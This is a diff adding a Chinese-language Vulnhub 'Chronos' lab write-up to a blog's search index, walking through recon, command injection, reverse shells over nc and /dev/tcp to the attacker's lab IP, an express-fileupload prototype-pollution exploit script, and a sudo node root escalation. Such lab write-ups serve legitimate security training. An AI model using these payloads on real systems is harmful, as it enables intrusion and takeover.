@@ -1608,4 +1608,141 @@
         <tag>反序列化</tag>
       </tags>
   </entry>
+  <entry>
+    <title>第3周：Vulnhub chronos writeup</title>
+    <url>/2022/04/01/%E7%AC%AC3%E5%91%A8%EF%BC%9AVulnhub%20chronos%20writeup/</url>
+    <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第3周，该靶机难度简单。</p>
+<span id="more"></span>
+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：https://www.vulnhub.com/entry/chronos-1,735/</p>
+<p>难度：Easy</p>
+<p>虚拟机软件：Virtual Box</p>
+<p>目标：取得2个flag，获得root权限</p>
+<p>涉及的攻击方法：</p>
+<ul>
+<li>端口扫描</li>
+<li>web侦察</li>
+<li>命令注入</li>
+<li>数据编、解码</li>
+<li><strong>搜索大法</strong></li>
+<li>*框架漏洞利用**</li>
+<li>代码审计</li>
+<li>NC串联</li>
+<li>本地提权</li>
+</ul>
+<h1 id="网卡配置">网卡配置</h1>
+<p>查看 <strong>第一周</strong> 的信息。</p>
+<p>攻击主机 kali：<code>192.168.137.104</code></p>
+<h1 id="渗透">渗透</h1>
+<h2 id="主机发现">主机发现</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.137.0/16 </span><br><span class="line"></span><br><span class="line">如果实际的子网掩码是24位，那么上面查询的时候就减8，也就是16。实际查询的子网掩码位数设置为实际的子网掩码位数减8效果最好。</span><br></pre></td></tr></table></figure>
+<p>原理：与前面的两者相同，都是通过ARP解析</p>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113217.png" /></p>
+<p>因此，靶机的IP为 192.168.137.105</p>
+<h2 id="端口扫描">端口扫描</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113352.png" /></p>
+<h2 id="端口服务发现">端口服务发现</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 192.168.137.105</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113546.png" /></p>
+<p>信息：</p>
+<ol type="1">
+<li>22端口上的服务为openssh</li>
+<li>80端口上的服务为http，版本为 2.4.29</li>
+<li>8000端口上的服务也是http，但是用的 <code>node.js express framework</code></li>
+<li>系统为Ubuntu</li>
+</ol>
+<h2 id="访问http服务">访问http服务</h2>
+<p>有三件事必须做：</p>
+<ol type="1">
+<li>抓包</li>
+<li>看源码</li>
+<li>扫目录</li>
+</ol>
+<p>发现80端口和8000端口很类似（一个朴素，一个华丽），源码是一样的，其中有一串特殊的字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure></p>
+<p>乍一看，好像是加密的js代码。这里推荐一个网址，可以对代码进行美化和编码解码：https://gchq.github.io/CyberChef/</p>
+<p>利用<code>javascript beautify</code>模块美化之后虽然看的很清楚了，但是因为各种参数都加密了还是无法直到这段代码的意思。但是其中有一串字符没有加密： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure></p>
+<p>最后，抓包看一下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401114650.png" /></p>
+<p>发现确实有数据包往 chronos.local:8000 地方发送，但是我们无法用浏览器直接访问，因为kali并不知道chronos.local是哪台主机，但是我们知道，这应该就是靶机。因此，修改<code>/etc/hosts</code>，添加一条记录：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120624.png" /></p>
+<p>然后可以访问了，并且页面发生了变化。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120700.png" /></p>
+<p>结合url分析，发现url中的那一串字符像是警告base64编码的，因此，再次利用刚刚的网址进行解码。利用 <code>magic</code> 模块进行解码，发现是base58编码。得到解码后的结果：<code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></p>
+<blockquote>
+<p>base系列有许多，但是常见的是base64和base32。还有许多不常见的，比如这里的base58。</p>
+</blockquote>
+<ol type="1">
+<li>date</li>
+<li><code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></li>
+<li>页面上显示的时间信息</li>
+</ol>
+<p>这让我想到Linux中的date命令，也是能够显示时间，因此在kali上尝试一下如下代码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401121236.png" /></p>
+<p>发现结果和页面显示的一模一样（未经过渲染）。因此，有理由怀疑后台服务调用了系统命令，并且后台代码可能如下（猜测，并不是真正的代码，只是说明代码逻辑）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;date&#x27; .$format;</span><br><span class="line">system(cmd);</span><br></pre></td></tr></table></figure></p>
+<p>如果我们什么都不修改，那么执行的命令就是<code>date '+Today is %A, %B %d, %Y %H:%M:%S.'</code>，因此，我们可以考虑到Linux中以下执行多条命令（上周使用的是管道符，这周使用 <code>$$</code>，该符号只有在前面的命令正确执行的情况下，才会执行后面的命令）</p>
+<p>先做一个尝试， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;ls -&gt; yZSGA</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401134641.png" /></p>
+<p>成功执行，因此这里确实调用了系统命令。接下来使用nc串联来反弹shell（先判断是否有nc，然后再判断是否有 -e）</p>
+<h2 id="反弹shell">反弹shell</h2>
+<p>首先在kali上启动两个监听端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
+<p>然后将payload base58编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 192.168.137.104 3333|/bin/bash|nc 192.168.137.104 4444</span><br><span class="line">2XqeYgBDNepmM9vgTVeLGrep4fZHdsG5tAFHFFoH1pgfmPx59cE4Pphh2FNWaHBapy5Tin3Vs6E4MYXhu</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135228.png" /></p>
+<p>虽然提示出错，但是kali已经成功连接上了</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135325.png" /></p>
+<p>接下来进行信息收集：</p>
+<p>发现在 <code>/home/imera</code> 目录下有一个<code>user.txt</code>文件，但是却没有权限读取，这应该就是其中一个flag了。并且在<code>/root</code>目录下也有一个flag，这应该是第二个flag，不出意料也没有权限读取。</p>
+<p>还可以看一下 <code>app.js</code> <code>package.jsom</code> 和 <code>package-lock.json</code> 的内容，其中第一个的源码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;exec&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line">app.use(cors());</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.sendFile(<span class="string">&#x27;/var/www/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> format = req.query.format;</span><br><span class="line">	<span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">	<span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">	<span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">	<span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">			res.send(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (error) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123; error.message &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123; stderr &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res.send(stdout);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.send(<span class="string">&#x27;Permission Denied&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123; port &#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>上述代码中就可以验证确实是执行了系统命令，并且还记得之前弹出的“something went wrong”吗？这是因为这里做了过滤，但是仅仅只是判断了以下，并没有阻止命令执行。这就叫百密一疏吧。</p>
+<p>还有一个目录 <code>/opt/chronos-v2</code>，里面有一个<code>backend</code>的目录，这一看就是与后台有关。里面有一个<code>server.js</code>，代码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;/opt/chronos-v2/frontend/pages&#x27;</span>);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>从这里能看出有一个8080端口，但是只能通过127.0.0.1才能访问，这也是为什么端口扫面无法得到这个端口。</p>
+<p>信息收集差不多，那么接下来就是要提权了。</p>
+<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
+<p>Linux提权常用的三种方式：</p>
+<ol type="1">
+<li>内核漏洞</li>
+<li>suid提权</li>
+<li>sudo配置不当提权</li>
+</ol>
+<p>这里经过测试发现前两者都不行。因此得另想办法，忽然想到之前信息收集得到了一个技术 node.js。查看了<code>/chronos-v2/backend/package.json</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401142659.png" /></p>
+<p>这里的是否存在文件上传的漏洞？因此去搜一下，发现虽然不存在文件上传漏洞，但是存在node.js的原型链污染，可以使用这个漏洞进行提权。</p>
+<p>博客地址如下：https://blog.p6.is/Real-World-JS-1/</p>
+<p>还提供了exp： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.137.104/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>（第一个ip为靶机IP，后面两个的端口为node.js所在端口，也就是8080，从刚刚的信息收集中知道）</p>
+<p>在kali上编写上面的程序，然后开启http服务，让靶机下载这个文件。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: python -m SimpleHTTPServer 80</span><br><span class="line">靶机: </span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.137.104/exp.py</span><br></pre></td></tr></table></figure></p>
+<p>然后kali监听8888端口，靶机执行该程序 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: nc -lvnp 8888</span><br><span class="line">靶机: </span><br><span class="line">	chmod +x exp.py</span><br><span class="line">	python3 exp.py</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145431.png" /></p>
+<p>获得 imera 权限，虽然不是root，但是也足够读取其中一个flag了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/imera/user.txt: </span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure></p>
+<p>接下来还需要提权，得到root权限。这里介绍常用的Linux提权的第三种，sudo配置提权。</p>
+<p>查看sudo配置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145800.png" /></p>
+<p>注意到用户imera拥有两个程序 npm和node的全部权限，还不需要密码，因此可以在这里提权。</p>
+<p>参考文章：https://gtfobins.github.io/gtfobins/node/</p>
+<p>执行以下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150130.png" /></p>
+<p>提权成功。</p>
+<p>获取第二个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt: </span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure></p>
+<p>至此，渗透过程结束。</p>
+<h1 id="彩蛋部分">彩蛋部分</h1>
+<p>将两个flag解码（base64），然后再放到谷歌去翻译，得到如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150635.png" /></p>
+<h1 id="总结">总结</h1>
+<p>通过对这个靶机的渗透，有以下几点感受：</p>
+<ol type="1">
+<li>如同第一次权限提升的时候，经常会遇到我们不熟悉的技术，这时候就需要大量的搜索，快速学习！</li>
+<li>学习了第三种Linux提权的方式</li>
+<li>express-fileupload 1.1.7 存在原型链污染漏洞</li>
+</ol>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>原型链污染</tag>
+      </tags>
+  </entry>
 </search>
